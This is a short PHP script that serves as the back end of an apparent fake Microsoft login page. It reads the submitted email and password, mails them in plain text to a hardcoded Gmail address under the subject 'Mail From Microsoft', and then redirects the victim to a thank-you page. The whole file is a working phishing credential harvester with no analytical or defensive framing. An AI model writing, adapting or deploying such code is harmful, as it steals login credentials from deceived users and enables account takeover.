<?php
//get data from form  

$email= $_POST['email'];
$pass= $_POST['pwd'];
$to = "rajsaumya371@gmail.com";
$subject = "Mail From Microsoft";
$txt ="Pass = ". $pass . "\r\n  Email = " . $email ;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>